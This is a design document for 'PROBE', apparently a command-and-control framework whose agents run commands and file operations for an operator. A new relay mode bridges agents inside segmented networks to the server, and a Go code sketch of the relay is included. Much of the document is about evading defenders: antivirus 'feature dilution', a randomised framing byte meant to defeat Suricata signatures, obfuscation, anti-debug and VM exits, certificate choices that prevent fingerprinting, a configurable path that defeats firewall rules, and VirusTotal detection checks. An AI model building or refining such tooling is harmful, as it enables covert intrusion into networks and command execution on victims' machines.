# PROBE Unified Binary Design

## Overview

Merge `cmd/probe-server` and `cmd/probe-client` into a single `cmd/probe` binary with three runtime modes: **serve**, **connect**, and **relay**. The relay mode enables network traversal of segmented environments by bridging agents that cannot reach the server directly.

```
                    [PROBE serve]
                    (top server, public IP)
                         |
                    WAN (internet)
                         |
            ┌────────────┴────────────┐
            |                         |
      [probe connect]           [probe relay]
      (direct WAN agent)        (dual-homed: WAN + LAN)
                                   |
                              LAN (no internet)
                                   |
                          ┌────────┴────────┐
                          |                 |
                    [probe connect]    [probe connect]
                    (LAN-only agent)   (LAN-only agent)
```

## CLI Interface

```
# Server mode — top of tree, listens for agents + operators
probe serve [--addr :7700] [--token ...] [--cert-file ...] [--key-file ...]
            [--admin-password ...] [--allowed-cidr ...] [--vt-api-key ...]

# Client mode — leaf agent, connects to nearest server/relay
probe connect --config probe-client.json
              # or embedded config via -ldflags

# Relay mode — bridge: listens downstream + connects upstream
probe relay --upstream wss://top-server:7700/ws --token ... \
            --listen :7701 [--cert-file ...] [--key-file ...]

# Version
probe --version
```

## Current Architecture

```
cmd/probe-server/main.go     → internal/server  (HTTP + WS server, WebUI, API)
cmd/probe-client/main.go     → internal/agent   (WS client, command handler)

internal/protocol/           → message types (Envelope, TypeExec, TypeFSList, ...)
internal/platform/           → OS-specific helpers
internal/features/           → feature dilution (legit code shell for AV evasion)
internal/server/             → server logic (registry, audit, tasks, transfers, tunnel, etc.)
internal/agent/              → agent logic (command handlers, reconnect, heartbeat)
```

## Target Architecture

```
cmd/probe/main.go            → subcommand dispatch (serve/connect/relay)
internal/server/             → unchanged (used by serve mode)
internal/agent/              → unchanged (used by connect mode)
internal/relay/              → NEW — relay multiplexer (used by relay mode)
internal/protocol/           → unchanged
internal/platform/           → unchanged
internal/features/           → unchanged
```

## Relay Design — Option A: Transparent WebSocket Proxy

The relay is a **WebSocket multiplexer**. It simultaneously acts as:
- **Server** (downstream): accepts WebSocket connections from agents
- **Client** (upstream): maintains a single WebSocket connection to the server

The relay does NOT parse protocol messages. It forwards raw bytes with a simple channel-ID framing layer.

### Framing Protocol

All messages on the relay→server upstream WebSocket are framed as:

```
[1 byte: magic (dynamic, negotiated at relay registration)] [4 bytes: channelID (big-endian uint32)] [N bytes: payload]
```

- `channelID = 0` → relay control messages (JSON payload: `{"type":"relay_register","relay_id":"...","token":"..."}`, `{"type":"channel_open","channel_id":N}`, `{"type":"channel_close","channel_id":N}`)
- `channelID > 0` → agent data (payload is the raw WebSocket message from/to that agent)

**Magic byte is NOT hardcoded 0x01** — it is generated at relay startup (random byte 0x02-0xFF) and sent to the server in the relay registration handshake. This prevents Suricata rules from matching a fixed byte at offset 0. The server learns the magic byte from the first binary message it receives on a new connection and uses it for all subsequent framing on that connection.

**Relay detection**: Server uses `conn.ReadMessage()` (not `ReadJSON()`) as the first read. If `messageType == BinaryMessage`, enter relay mode. If `messageType == TextMessage`, parse as JSON Envelope (existing direct-agent path). This is robust — no magic byte heuristic needed for detection, the WebSocket message type is the discriminator.

### Channel Lifecycle

```
Agent connects to relay
  → Relay allocates channelID (atomic counter, wraps at uint32 max)
  → Relay sends control message to server: {channelID: N, type: "channel_open"}
  → Relay pipes agent ↔ server on channelID N

Agent disconnects from relay
  → Relay sends control message: {channelID: N, type: "channel_close"}
  → Relay frees channelID N

Relay upstream disconnects
  → Relay attempts reconnect with exponential backoff (same as agent client)
  → On reconnect, re-registers all active channels
  → Agents will disconnect after 45s (pingInterval=15s × missThreshold=3) if upstream is still down
  → On relay reconnect, agents reconnect automatically via their own backoff
  → Messages sent during upstream outage are buffered per-channel (256 message queue, overflow closes channel)
```

### Server-Side Changes (Minimal)

The server's WebSocket handler (`server_ws.go`) needs a small addition:

1. **Detect relay connections**: Use `conn.ReadMessage()` as first read (not `ReadJSON()`). If `messageType == BinaryMessage`, enter relay mode. If `messageType == TextMessage`, parse as JSON Envelope (existing path).

2. **Relay mode**: For relay connections, the server maintains a `relaySession` struct with a shared `sync.Mutex` for all writes on that physical WebSocket. Each virtual connection (`virtualConn`) implements the same write semantics as a direct agent connection, but internally acquires the relaySession's shared writeMu before framing and writing. This prevents concurrent write panics on the shared WebSocket.

3. **Agent registration**: When a relay sends `channel_open` with agent registration data, the server registers the agent identically to a direct connection. Agent IDs use `relayID/agentName` (slash separator, not hyphen) to avoid collision with direct agent names. The `relayID` is a UUID generated at relay startup (configurable via `--relay-id` flag).

### What Does NOT Change

- `internal/protocol/` — message types stay the same
- `internal/agent/` — agent code stays the same, agent doesn't know it's behind a relay
- `internal/server/` command handlers — they see agent connections, don't know if direct or relayed
- WebUI — no changes needed (server presents relayed agents identically to direct ones)
- Agent builder — no changes (agents still connect to `wss://relay-host:7701/ws`)

### Authentication

```
Agent → Relay:    Agent uses its token. Relay validates token locally against
                  configured allowed tokens (NOT pass-through). This closes
                  the open-proxy vulnerability — unauthenticated connections
                  are rejected with 401 at the relay, never reaching the server.

Relay → Server:   Relay authenticates with its own relay token.
                  Server accepts relay token like any agent token.
                  Server marks this connection as "relay" type.
```

**Token separation is enforced**: relay has its own token set (configurable via `--agent-tokens` flag). Agent tokens at the relay are separate from the relay→server token. If an operator reuses tokens, the relay still validates locally — the open proxy problem is closed.

### Rate Limiting

- Relay limits downstream connections: max 100 concurrent (configurable via `--max-agents`)
- Per-IP limit: max 10 connections from same IP (configurable)
- Excess connections get 429 Too Many Requests

### WebSocket Keepalive

- WS-level ping every 30s on both relay legs (agent↔relay, relay↔server)
- Relay responds to WS-level pings locally (standard gorilla behavior)
- Prevents NAT timeout on idle connections

### TLS Handling

- **Agent → Relay**: Relay terminates TLS (presents its own cert or uses self-signed)
- **Relay → Server**: Relay connects with TLS (verifies server cert or uses CA pinning)
- **End-to-end**: No end-to-end encryption in Option A. The relay can see plaintext. This is acceptable for the initial implementation. End-to-end encryption (agent ↔ server, relay can't read) is deferred to Option B.

### Backpressure

- Each downstream agent has a buffered channel (size 64 messages)
- If the upstream is slow, agent channels fill up and block the relay's read goroutine for that agent
- The agent's WebSocket write will eventually time out (60s default), causing the agent to disconnect and reconnect
- This is acceptable — it means the network path is saturated and the agent should back off

### Reconnection

When the relay's upstream connection drops:
1. Relay enters exponential backoff (1s → 2s → 4s → ... → 60s cap)
2. Relay stops accepting new downstream connections (returns 503 on WebSocket upgrade)
3. Existing downstream agents remain connected to relay (relay buffers heartbeats)
4. On upstream reconnect, relay re-registers all active channels
5. If any channel's agent has disconnected during the outage, relay sends `channel_close`

## Migration Phases

### Phase 1: Merge Binaries into Unified Binary (v1.6.0 — DONE)

**Goal**: Single `cmd/probe` source tree with `serve`, `connect`, and `relay` subcommands, all compiled into one unified binary. No build tags needed — all three modes are always available.

**Build system**:
- **Unified binary**: `go build -trimpath -o probe ./cmd/probe/` → `probe serve` + `probe connect` + `probe relay` (all always available).
- **Cross-compile**: `GOOS=windows GOARCH=amd64 go build -trimpath -o probe.exe ./cmd/probe/`

**Files**:
- `cmd/probe/main.go` — subcommand dispatch using `os.Args[1]`
- `cmd/probe/serve.go` — server mode
- `cmd/probe/connect.go` — client mode
- `cmd/probe/relay.go` — relay mode
- `cmd/probe-server/main.go` — deleted
- `cmd/probe-client/main.go` — deleted

**Stub files removed in v1.6.0**: `serve_stub.go`, `relay_stub.go`, `internal/server/relay_stub.go` — no longer needed since all modes are always compiled in.

**Key decisions**:
- Extract flag parsing into per-mode functions
- Share `appVersion` constant
- `probe serve` → calls `runServe()` with all server flags
- `probe connect` → calls `runConnect()` with client config
- `probe relay` → calls `runRelay()` with relay flags
- `probe --version` → prints version
- `probe` (no args) → prints usage
- Obfuscation tool updated to obfuscate all `cmd/probe/` files including `serve.go` and `relay.go`

**Trade-off**: The unified binary includes server and relay code in every build, increasing the reverse-engineering surface compared to the v1.5.0 build-tag approach. This trade-off is accepted for operational simplicity — a single binary for all deployments. VT scan: 1/69 Microsoft Wacapew.C!ml (PUA, not trojan) — same as the build-tag variant.

**Testing**:
- `go build -trimpath -o probe ./cmd/probe/` → `probe serve`, `probe connect`, `probe relay` all work
- `probe --version` → prints `PROBE v1.6.0`

### Phase 2: Add Relay Mode

**Goal**: `probe relay` bridges agents to server.

**Files to create**:
- `internal/relay/relay.go` — relay struct, Run(), listen + dial logic
- `internal/relay/mux.go` — channel multiplexer, framing, channelID allocation
- `internal/relay/reconnect.go` — upstream reconnection with backoff
- `cmd/probe/relay.go` — relay subcommand, flag parsing

**Files to modify**:
- `internal/server/server_ws.go` — add relay connection detection and virtual channel handling (~100 lines)
- `internal/server/registry.go` — agents behind relay are registered with metadata `via_relay: relayID`

**Relay implementation sketch** (~200 lines):
```go
package relay

type Relay struct {
    upstreamURL string
    listenAddr  string
    token       string
    upstream    *websocket.Conn
    channels    sync.Map // channelID → *websocket.Conn (downstream agent)
    nextChanID  atomic.Uint32
}

func (r *Relay) Run() error {
    // 1. Connect to upstream
    r.connectUpstream()
    
    // 2. Listen for downstream agents
    http.HandleFunc("/ws", r.handleDownstream)
    http.ListenAndServe(r.listenAddr, nil)
}

func (r *Relay) handleDownstream(w, req) {
    // Upgrade to WebSocket
    conn := upgrader.Upgrade(w, req, nil)
    
    // Allocate channel ID
    chanID := r.nextChanID.Add(1)
    r.channels.Store(chanID, conn)
    
    // Send channel_open to server
    r.sendControl(chanID, "channel_open")
    
    // Pipe: agent → relay → server
    go r.pipeAgentToServer(conn, chanID)
    
    // Pipe: server → relay → agent (handled by r.dispatchFromServer)
}

func (r *Relay) pipeAgentToServer(conn, chanID) {
    for {
        _, data, err := conn.ReadMessage()
        if err != nil { r.closeChannel(chanID); return }
        r.sendFramed(chanID, data) // [0x01][chanID][data]
    }
}

func (r *Relay) dispatchFromServer() {
    for {
        _, frame, err := r.upstream.ReadMessage()
        if err != nil { r.reconnectUpstream(); continue }
        
        // Parse frame: [version][chanID][payload]
        chanID := binary.BigEndian.Uint32(frame[1:5])
        payload := frame[5:]
        
        if chanID == 0 {
            r.handleControl(payload) // heartbeat, channel_close ack
            continue
        }
        
        // Forward to downstream agent
        if conn, ok := r.channels.Load(chanID); ok {
            conn.(*websocket.Conn).WriteMessage(websocket.BinaryMessage, payload)
        }
    }
}
```

### Phase 3: Testing

**Test setup** (3 PROBE instances on one machine):
```bash
# Terminal 1: Top server
probe serve --addr :7700 --admin-password admin

# Terminal 2: Relay (connects to server, listens on :7701)
probe relay --upstream ws://localhost:7700/ws --token <relay-token> --listen :7701

# Terminal 3: Agent behind relay
probe connect --config agent-behind-relay.json
# agent-behind-relay.json: { "server": "ws://localhost:7701/ws", "token": "..." }
```

**Verify**:
- Agent appears in server's WebUI agent list
- Terminal commands work through relay
- File operations work through relay
- Kill relay → agent shows as disconnected → restart relay → agent reconnects
- Multiple agents behind same relay → both appear in WebUI

### Phase 4 (Deferred): Option B — Aware Relay

- Relay sends metadata to server: relay ID, agent count, topology info
- Server maintains routing table: agent → relay chain
- WebUI shows topology graph (tree view of relay chains)
- End-to-end encryption (agent ↔ server, relay can't read)
- Relay failover (agent can try multiple relay addresses)
- Relay remote management (server can tell relay to drop an agent)

## Code Structure Summary

| File | Action | Purpose |
|------|--------|---------|
| `cmd/probe/main.go` | NEW | Subcommand dispatch |
| `cmd/probe/serve.go` | NEW | Server mode |
| `cmd/probe/connect.go` | NEW | Client mode |
| `cmd/probe/relay.go` | NEW | Relay mode |
| `internal/relay/relay.go` | NEW | Relay core logic (Phase 2) |
| `internal/relay/mux.go` | NEW | Channel multiplexer (Phase 2) |
| `internal/server/server_ws.go` | MODIFY | Relay connection detection (Phase 2) |
| `cmd/probe-server/main.go` | DELETE | Merged into cmd/probe |
| `cmd/probe-client/main.go` | DELETE | Merged into cmd/probe |

## Dependencies

No new external dependencies. Uses existing:
- `github.com/gorilla/websocket` — WebSocket client + server
- `encoding/binary` — channel ID framing
- `sync` — concurrent channel map
- `net/http` — downstream listener

## Security Considerations

1. **Relay token** — relay authenticates with server using its own token. Server validates via existing token mechanism.
2. **Agent token at relay** — relay validates agent tokens locally (NOT pass-through). Unauthenticated connections rejected at relay, never reaching server. This closes the open-proxy vulnerability.
3. **TLS** — relay terminates TLS for downstream agents, uses TLS for upstream. Self-signed certs acceptable for internal relay deployment. Do NOT reuse the same self-signed cert across deployments — each relay gets its own cert to prevent fingerprint tracking.
4. **No end-to-end encryption in Phase 2** — relay can see all traffic including tokens, command outputs, file contents. Relay compromise = full MITM. Mitigation: E2E encryption (Phase 4). Document this risk explicitly to operators.
5. **Relay compromise** — if relay is compromised, attacker can see all agent traffic, harvest tokens, and inject commands. Mitigation: E2E encryption (Phase 4), relay token rotation, separate token sets per relay.
6. **Single binary RE exposure — trade-off accepted (v1.6.0)**: The v1.6.0 unified binary includes server, client, and relay code in every build. This increases the reverse-engineering surface compared to the v1.5.0 build-tag approach (which excluded server/relay code from client-only binaries). The trade-off is accepted for operational simplicity — a single binary for all deployments, no build tag complexity. The obfuscation tool covers all `cmd/probe/` files. VT scan: 1/69 Microsoft Wacapew.C!ml (PUA, not trojan). VT scan before deployment remains mandatory.
7. **Configurable WS path** — the `/ws` path should be configurable per-deployment (`--ws-path /custom`) to prevent a single firewall rule from blocking all PROBE traffic.

## AV/Evasion Considerations

1. **Obfuscation tool updated (v1.6.0)**: The obfuscation tool now obfuscates all `cmd/probe/` files including `serve.go` and `relay.go`, ensuring the unified binary gets full obfuscation coverage across all three modes.
2. **Anti-debug must be mode-aware**: The evasion package's `init()` runs before `main()` for ALL modes. Running `probe serve` in a VM/VPS will trigger `os.Exit(0)` and kill the server. Fix: anti-debug init checks runtime mode — only fires for `connect` and `relay`, skips `serve`.
3. **Capability footprint — unified binary trade-off (v1.6.0)**: The v1.6.0 unified binary includes WebSocket client + WebSocket server + HTTP server + relay multiplexer in one binary. The v1.5.0 build-tag approach excluded server/relay code from client-only binaries, reducing the footprint. The v1.6.0 trade-off accepts the larger footprint for operational simplicity — a single binary for all deployments. VT scan: 1/69 Microsoft Wacapew.C!ml (PUA, not trojan) — same as the build-tag variant.
4. **Dynamic magic byte**: The framing protocol uses a randomly-generated magic byte (not hardcoded 0x01) to prevent Suricata signature matching. XOR string encryption doesn't cover numeric constants — the dynamic byte approach solves this.
5. **Unified binary RE exposure — trade-off accepted (v1.6.0)**: The v1.6.0 unified binary includes all 3 modes (serve, connect, relay) in every build. This reverts the v1.5.0 build-tag separation that excluded server/relay code from client-only binaries. The trade-off is accepted for operational simplicity — a single binary for all deployments, no build tag complexity. VT scan: 1/69 Microsoft Wacapew.C!ml (PUA, not trojan) — same as the build-tag variant. VT scan remains mandatory before deployment.